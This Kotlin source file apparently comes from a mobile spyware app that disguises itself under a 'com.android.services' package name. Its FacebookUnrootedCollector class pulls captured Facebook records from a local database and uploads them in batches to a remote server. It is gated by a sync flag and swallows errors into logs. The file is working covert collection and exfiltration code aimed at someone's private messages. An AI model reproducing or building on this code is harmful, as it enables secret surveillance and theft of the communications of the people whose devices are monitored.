package com.android.services.logs.collectors.im

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose

class FacebookUnrootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi
) : LogsCollector {
    override fun uploadLogs() {
        if (AppConstants.syncFacebook) {
            try {
                val facebookUnrootedList = localDatabaseSource.selectFacebookUnrooteds()
                if (facebookUnrootedList.isNotEmpty()) {
                    val endId = facebookUnrootedList[facebookUnrootedList.size - 1].id
                    val startId = facebookUnrootedList[0].id
                    val remoteServerHelper = RemoteServerHelper(
                        context,
                        AppConstants.FACEBOOK_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi,
                        startId = startId,
                        endId=endId
                    )
                    remoteServerHelper.upload(facebookUnrootedList)
                }
            } catch (ex: Exception) {
                logException(
                    "${AppConstants.FACEBOOK_UNROOTED_TYPE} ${AppUtils.currentMethod} exp = ${ex.message}",
                    throwable = ex
                )
            }
        }else{
            logVerbose("${AppConstants.FACEBOOK_UNROOTED_TYPE} Sync is Off")

        }
    }
}